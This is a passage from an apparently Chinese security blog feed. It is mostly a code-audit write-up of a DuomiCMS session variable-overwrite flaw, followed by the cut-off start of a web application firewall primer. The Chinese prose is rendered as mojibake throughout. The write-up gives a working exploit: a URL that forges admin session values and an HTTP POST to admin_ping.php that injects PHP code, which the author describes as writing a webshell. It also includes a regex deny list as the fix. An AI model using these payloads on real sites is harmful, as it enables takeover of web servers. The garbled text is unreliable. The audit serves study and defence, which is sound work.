class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userPwd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userID</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$adminDir</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$groupid</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserIDTag</span> = <span class="string">&quot;duomi_admin_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepgroupidTag</span> = <span class="string">&quot;duomi_group_id&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$keepUserNameTag</span> = <span class="string">&quot;duomi_admin_name&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admindir</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$admin_path</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserIDTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepgroupidTag];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$_SESSION</span>[<span class="variable language_">$this</span>-&gt;keepUserNameTag];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œè®°å½•äº†ç”¨æˆ·åå­—ã€æ‰€å±ç»„ã€ç”¨æˆ·ï¼Œå†æ¥çœ‹çœ‹ <strong>admin</strong> æ‰€å¯¹åº”çš„è¿™ä¸‰ä¸ªå€¼åˆ†åˆ«æ˜¯å¤šå°‘ã€‚æ‰¾åˆ° <strong>admin\login.php</strong> æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬åªè¦è®© <strong>checkUser</strong> æ–¹æ³•è¿”å›1å³æ˜¯adminç”¨æˆ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span>==<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$validate</span> = <span class="keyword">empty</span>(<span class="variable">$validate</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$validate</span>));</span><br><span class="line">    <span class="variable">$svali</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">GetCkVdValue</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$validate</span>==<span class="string">&#x27;&#x27;</span> || <span class="variable">$svali</span> != <span class="variable">$svali</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">ResetVdValue</span>();</span><br><span class="line">        <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;éªŒè¯ç ä¸æ­£ç¡®ï¼&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cuserLogin</span> = <span class="keyword">new</span> <span class="title function_ invoke__">userLogin</span>(<span class="variable">$admindir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$userid</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$pwd</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">checkUser</span>(<span class="variable">$userid</span>, <span class="variable">$pwd</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$cuserLogin</span>-&gt;<span class="title function_ invoke__">keepUser</span>();</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$gotopage</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;æˆåŠŸç™»å½•ï¼Œæ­£åœ¨è½¬å‘ç®¡ç†ç®¡ç†é¡µï¼&#x27;</span>, <span class="variable">$gotopage</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">ShowMsg</span>(<span class="string">&#x27;ç™»å½•å¤±è´¥ï¼Œæ­£åœ¨è½¬å‘ç®¡ç†ç®¡ç†é¡µï¼&#x27;</span>, <span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› <strong>duomiphp\check.admin.php</strong> æ–‡ä»¶çš„ <strong>checkUser</strong> æ–¹æ³•ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUser</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$userpwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userName = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userPwd = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$userpwd</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;userPwd),<span class="number">5</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="string">&quot;Select * From duomi_admin where name like &#x27;&quot;</span>.<span class="variable">$this</span>-&gt;userName.<span class="string">&quot;&#x27; and state=&#x27;1&#x27; limit 0,1&quot;</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetObject</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$row</span>-&gt;password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$pwd</span>!=<span class="variable">$row</span>-&gt;password)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$loginip</span> = <span class="title function_ invoke__">GetIP</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$row</span>-&gt;id;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$row</span>-&gt;groupid;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$row</span>-&gt;name;</span><br><span class="line">        <span class="variable">$inquery</span> = <span class="string">&quot;update duomi_admin set loginip=&#x27;<span class="subst">$loginip</span>&#x27;,logintime=&#x27;&quot;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&quot;&#x27; where id=&#x27;&quot;</span>.<span class="variable">$row</span>-&gt;id.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">ExecuteNoneQuery</span>(<span class="variable">$inquery</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ­£ç¡®adminè´¦å·å¯†ç ç™»å½•åå°ï¼Œå¯ä»¥è§‚å¯Ÿåˆ°adminç”¨æˆ·å¯¹åº”çš„ç”¨æˆ·å’Œæ‰€å±ç»„å‡ä¸º1ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-28.png"></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬åªè¦åˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œè¦†ç›– <strong>session</strong> çš„å€¼ï¼Œä»è€Œä¼ªé€  <strong>admin</strong> èº«ä»½ï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„å†™shelläº†ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æˆ‘ä»¬éœ€è¦å…ˆæ‰¾ä¸€äº›å¼€å¯ <strong>session_start</strong> å‡½æ•°çš„ç¨‹åºæ¥è¾…åŠ©æˆ‘ä»¬ä¼ªé€ èº«ä»½ï¼Œæˆ‘ä»¬è¿™é‡Œå°±é€‰æ‹© <strong>member&#x2F;share.php</strong> æ–‡ä»¶ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-29.png"></p><p>æˆ‘ä»¬å…ˆè®¿é—®å¦‚ä¸‹ <strong>payload</strong> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/member/share.php?_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®¿é—® <strong>payload</strong> åï¼Œæˆ‘ä»¬å¯¹åº” <strong>session</strong> çš„ç”¨æˆ·å’Œæ‰€å±ç»„éƒ½å˜æˆäº†1ã€‚ç„¶åï¼Œæˆ‘ä»¬å†POSTå¦‚ä¸‹æ•°æ®åŒ…å†™å…¥webshellï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/admin_ping.php?action=set</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.localhost.com</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">weburl</span><span class="operator">=</span><span class="string">&quot;;phpinfo();//&amp;token=</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-30.png"></p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>å®é™…ä¸Šï¼Œè¿™ä¸ªæ¼æ´å’Œ <strong>Dedecms</strong> å˜é‡è¦†ç›–æ¼æ´å¾ˆç›¸ä¼¼ã€‚è€Œåœ¨ <strong>Dedecms</strong> çš„å®˜æ–¹ä¿®å¤ä»£ç ä¸­ï¼Œå¤šäº†æ£€æµ‹å˜é‡åæ˜¯å¦ä¸ºPHPåŸæœ‰çš„è¶…å…¨å±€æ•°ç»„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç›´æ¥é€€å‡ºå¹¶å‘ŠçŸ¥å˜é‡ä¸å…è®¸ï¼Œå…·ä½“ä¿®å¤ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$s_k</span> =&gt; <span class="variable">$s_v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$svar</span>[<span class="variable">$s_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$s_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$svar</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#x27;</span>, <span class="variable">$svar</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘Webåº”ç”¨é˜²ç«å¢™</title>
      <link href="/2024/10/15/WebSecurity/framwork/waf/"/>
      <url>/2024/10/15/WebSecurity/framwork/waf/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« å†™çš„å¾ˆå¥½ï¼š<a href="https://zhuanlan.zhihu.com/p/542011331">WAFå…¥é—¨æ‰«ç›²ç¯‡ï¼ˆä¸€éå°±æ‡‚ï¼‰</a><br><a href="https://habr.com/en/companies/dsec/articles/454592/">https://habr.com/en/companies/dsec/articles/454592/</a></p><h2 id="å¼•è¨€-ä»‹ç»WAF"><a href="#å¼•è¨€-ä»‹ç»WAF" class="headerlink" title="å¼•è¨€&amp;&amp;ä»‹ç»WAF"></a>å¼•è¨€&amp;&amp;ä»‹ç»WAF</h2><p>æ—©å°±æƒ³æ•´ç†æœ‰å…³wafç›¸å…³çš„å†…å®¹äº†ï¼Œä»Šå¤©ç³»ç»Ÿæ¢³ç†ä¸‹</p><h3 id="WAFçš„éƒ¨ç½²æ¨¡å¼"><a href="#WAFçš„éƒ¨ç½²æ¨¡å¼" class="headerlink" title="WAFçš„éƒ¨ç½²æ¨¡å¼"></a>WAFçš„éƒ¨ç½²æ¨¡å¼</h3><p>å¦‚æœWAFåƒä¼ ç»Ÿé˜²ç«å¢™é‚£æ ·ï¼Œæ”¾ç½®åœ¨ç½‘ç»œå…¥å£ï¼Œé‚£ä¹ˆï¼Œå¯¹äºDDOSæ”»å‡»æ¥è¯´ï¼Œå®ƒæ˜¯å¾ˆå®¹æ˜“æ²¦é™·çš„ã€‚æ‰€ä»¥WAFä¸€èˆ¬æ˜¯éƒ¨ç½²åœ¨é˜²ç«å¢™ï¼ˆç‰¹åˆ«æ˜¯é«˜é˜²DDOSè®¾å¤‡ï¼‰åé¢ï¼ŒåŸºæœ¬æ¶æ„å¦‚ä¸‹å›¾<br><img src="/2024/10/15/WebSecurity/framwork/waf/image.png"><br>ç”±äºæ€§èƒ½å·®å¼‚è¿™ä¹ˆå¤§ï¼Œæ‰€ä»¥WAFå’Œé˜²ç«å¢™ä¹‹é—´è¿˜ä¼šéƒ¨ç½²è´Ÿè½½å‡è¡¡è®¾å¤‡ã€‚<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-1.png"></p><table><thead><tr><th>éƒ¨ç½²æ–¹å¼</th><th>å·¥ä½œåŸç†</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>é€æ˜æ¨¡å¼</td><td>å·¥ä½œæ¨¡å¼ä¸ºé€æ˜æ¡¥æ¨¡å¼ï¼Œæ£€æµ‹ã€è¿‡æ»¤æˆ–è½¬å‘ä¸¤è€…ä¹‹é—´çš„ä¼šè¯ï¼Œå®¢æˆ·ç«¯ç›´æ¥è®¿é—®WebæœåŠ¡å™¨ï¼Œæ„ŸçŸ¥ä¸åˆ°WAFå­˜åœ¨ã€‚</td><td>é…ç½®ç®€å•ï¼Œä¸æ”¹å˜åŸæœ‰ç½‘ç»œç¯å¢ƒï¼Œé€šè¿‡ç¡¬ä»¶BypassåŠŸèƒ½ä¸å½±å“ç½‘ç»œåŸæœ‰ä¸šåŠ¡é€šè®¯</td><td>BypassåŠŸèƒ½å¯åŠ¨åWAFè‡ªèº«åŠŸèƒ½å¤±æ•ˆï¼Œç½‘ç»œæ‰€æœ‰æµé‡éƒ½ç»è¿‡WAFï¼Œå¯¹è®¾å¤‡ç¡¬ä»¶æ€§èƒ½è¦æ±‚é«˜</td></tr><tr><td>è·¯ç”±ä»£ç†æ¨¡å¼</td><td>å·¥ä½œæ¨¡å¼ä¸ºè·¯ç”±è½¬å‘æ¨¡å¼ï¼Œéœ€è¦é…ç½®WAFçš„è½¬å‘æ¥å£IPåœ°å€ä»¥åŠè·¯ç”±ï¼Œå…¶å®ƒå’Œé€æ˜æ¨¡å¼ä¸€æ ·ã€‚</td><td>é…ç½®ç›¸å¯¹ç®€å•ï¼Œä¸æ”¹å˜åŸæœ‰ç½‘ç»œç¯å¢ƒ</td><td>å­˜åœ¨å•ç‚¹æ•…éšœé—®é¢˜ï¼Œè´Ÿè´£è½¬å‘æ‰€æœ‰æµé‡</td></tr><tr><td>åå‘ä»£ç†æ¨¡å¼</td><td>å·¥ä½œåŸç†æ˜¯å°†WebæœåŠ¡å™¨çš„åœ°å€æ˜ å°„åˆ°åå‘ä»£ç†æœåŠ¡å™¨ä¸Šï¼Œå®¢æˆ·ç«¯å®é™…è®¿é—®çš„æ˜¯WAFï¼Œç”±WAFæ¥è½¬å‘è¯·æ±‚å’Œå“åº”ã€‚</td><td>èƒ½å¤Ÿæ”¯æŒè´Ÿè½½å‡è¡¡</td><td>é…ç½®è¾ƒä¸ºå¤æ‚ï¼Œéœ€è¦æ”¹å˜åŸæœ‰ç½‘ç»œç¯å¢ƒ</td></tr><tr><td>æ—è·¯æ¨¡å¼</td><td>å·¥ä½œæ¨¡å¼ä¸ºæ—å¬æ¨¡å¼ï¼Œå°†äº¤æ¢æœºç«¯å£ä¸Šçš„HTTPæµé‡é•œåƒåˆ°WAFï¼ŒWAFå¯¹HTTPæµé‡è¿›è¡Œç›‘æ§å’ŒæŠ¥è­¦ã€‚</td><td>ä¸æ”¹å˜åŸæœ‰ç½‘ç»œç¯å¢ƒï¼Œå¯¹åŸæœ‰ç½‘ç»œä¸ä¼šæœ‰å½±å“</td><td>åªè¿›è¡Œç›‘æ§å’ŒæŠ¥è­¦ï¼Œä¸è¿›è¡Œé˜»æ–­ï¼Œè¾¾ä¸åˆ°Webé˜²æŠ¤åŠŸèƒ½</td></tr></tbody></table><h3 id="WAFå·¥ä½œæ¨¡å¼"><a href="#WAFå·¥ä½œæ¨¡å¼" class="headerlink" title="WAFå·¥ä½œæ¨¡å¼"></a>WAFå·¥ä½œæ¨¡å¼</h3><p>å…³é—­æ¨¡å¼ï¼šå¯éšæ—¶å…³é—­ï¼Œä¸å½±å“æ•´ä¸ªä¸šåŠ¡<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-2.png"><br>WAFçš„ç›‘å¬æ¨¡å¼æ˜¯æ—¢è¿‡è§„åˆ™ï¼Œä¹Ÿä¼šç›´æ¥ä¼ é€’ç»™webæœåŠ¡<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-3.png"><br>WAFçš„é˜²æŠ¤æ¨¡å¼æ˜¯ç›´æ¥è¿‡è§„åˆ™ï¼Œä¸ä¼šç›´æ¥ä¼ é€’ç»™webæœåŠ¡<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-4.png"></p><h3 id="è§„åˆ™å¼•æ“åŸç†"><a href="#è§„åˆ™å¼•æ“åŸç†" class="headerlink" title="è§„åˆ™å¼•æ“åŸç†"></a>è§„åˆ™å¼•æ“åŸç†</h3><ol><li>è¯·æ±‚éƒ¨åˆ†<ul><li>ç½‘ç»œå±‚<ul><li>ç™½åå•ï¼šå¾ˆå¤šæ—¶å€™éƒ¨ç½²åœ¨WAFåé¢çš„åº”ç”¨ï¼Œéœ€è¦æµ‹è¯•æ¥å£å¯¹éæ³•è¾“å…¥çš„å¤„ç†ï¼Œä½†åˆä¸æƒ³å…³é—­å¯¹è¯¥ç«™ç‚¹çš„ç›‘æ§ï¼Œä¸ºäº†é˜²æ­¢WAFå¯¹æµ‹è¯•æ´»åŠ¨çš„å½±å“ï¼Œå¯¹æ¥æºIPå’Œç›®æ ‡IPè®¾ç½®ç™½åå•ï¼Œç»•è¿‡WAFçš„æ‹¦æˆªã€‚ä»æ€§èƒ½è§’åº¦æ¥è€ƒè™‘ï¼Œç™½åå•è¿‡æ»¤åŠŸèƒ½æ˜¯ä¸å¯èƒ½æ”¾åœ¨å…¶å®ƒè¿‡æ»¤åŠŸèƒ½åé¢ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥æ˜¯è§„åˆ™å¼•æ“åœ¨ç½‘ç»œå±‚è¿‡æ»¤çš„ç¬¬ä¸€æ­¥ã€‚</li><li>é»‘åå•ï¼šåŒæ ·ï¼Œå¯¹äºå·²çŸ¥æœ‰å®³çš„æ¥æºIPï¼Œæ˜¯è¶Šæ—©æ‹¦æˆªè¶Šå¥½ï¼Œå‡ºäºæ€§èƒ½è€ƒè™‘ï¼Œé»‘åå•æ‹¦æˆªåŠŸèƒ½åº”è¯¥åœ¨ç½‘ç»œå±‚ï¼Œé‚£ä¹ˆå®ƒåº”è¯¥ç´§è·Ÿåœ¨ç™½åå•åé¢ã€‚</li></ul></li><li>åº”ç”¨å±‚<ul><li>httpsæ‹†è§£ï¼šéšç€httpsè¶Šæ¥è¶Šæ™®åŠï¼ŒWAFéœ€è¦å¯¹httpsè¯·æ±‚å’Œå“åº”è¿›è¡Œæ£€æµ‹å’Œè¿‡æ»¤ï¼Œæ‰€ä»¥ï¼ŒWAFå¿…é¡»æ”¯æŒä½¿ç”¨è¯ä¹¦å¯¹httpså†…å®¹è¿›è¡Œæ‹†è§£ã€‚</li><li>httpæ–¹æ³•é˜²æŠ¤ï¼šä¸å°‘httpæ–¹æ³•æ˜¯æœ‰å®‰å…¨é£é™©çš„ï¼Œå¦‚æœwebserverçš„é…ç½®æœ‰é—®é¢˜ï¼Œå¦‚æœä¸åœ¨è¿™ä¸€æ­¥æ‹¦æˆªæ‰ï¼Œè€Œurlç™½åå•çš„æ¥æºIPåˆå¯èƒ½è¢«æ”»å‡»ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­˜åœ¨ç«™ç‚¹æ²¦é™·çš„é£é™©ã€‚ä¸€èˆ¬æ˜¯æ‹¦æˆªé™¤äº†HEADï¼ŒGETï¼ŒPOSTä¹‹å¤–çš„æ–¹æ³•</li><li>urlç™½åå•ï¼šç”±äºæŸäº›æ¥å£ï¼ˆå¦‚è¯·æ±‚æŸäº›é™æ€èµ„æºï¼‰å¹¶ä¸ä¼šå­˜åœ¨æ¼æ´ï¼Œæ²¡å¿…è¦å¯¹è¿™äº›urlè¿›è¡Œè§„åˆ™è¿‡æ»¤ï¼Œæˆ–è€…é˜²æŠ¤ç«™ç‚¹æŸäº›urlæ¥å£æœ‰æ‰€æ›´æ–°ï¼Œéœ€è¦ç‰¹å®šçš„æ¥æºIPè¿›è¡Œæµ‹è¯•ã€‚åº”å½“å­˜åœ¨urlå’Œæ¥æºIPå¯¹åº”çš„ç™½åå•</li><li>urlé»‘åå•ï¼šåŒæ ·ç”±äºæŸäº›æ¥å£çš„å®ç°å¯èƒ½ä¼šæ¶‰åŠå¤§é‡è¿ç®—ï¼Œå¯èƒ½éœ€è¦å¯¹è¯¥urlè®¿é—®è¿›è¡Œæ¬¡æ•°é™åˆ¶ï¼Œéœ€è¦å­˜åœ¨ä¸€ä¸ªurlå’Œæ¬¡æ•°çš„é»‘åå•ã€‚</li><li>httpè¯·æ±‚è§£ç ï¼šhttpè¯·æ±‚å¾ˆå¤šæ—¶å€™å¯¹å¤´éƒ¨å’Œå†…å®¹çš„æ•°æ®å¾€å¾€ä¼šè¿›è¡Œç¼–ç ï¼Œå¦‚urlç¼–ç ï¼Œhtmlç¼–ç ï¼Œjsç¼–ç ï¼Œåå…­åˆ¶ç¼–ç ï¼Œbase64ç¼–ç ï¼Œä¸»è¦æ˜¯ä¸ºäº†ä¼ è¾“ä¸€äº›äºŒè¿›åˆ¶æ•°æ®ï¼Œæˆ–æ”»å‡»è€…ç”¨äºç»•è¿‡å„ç§é˜²æŠ¤è®¾å¤‡ã€‚åªæœ‰å¯¹æ•°æ®è¿›è¡Œè§£ç 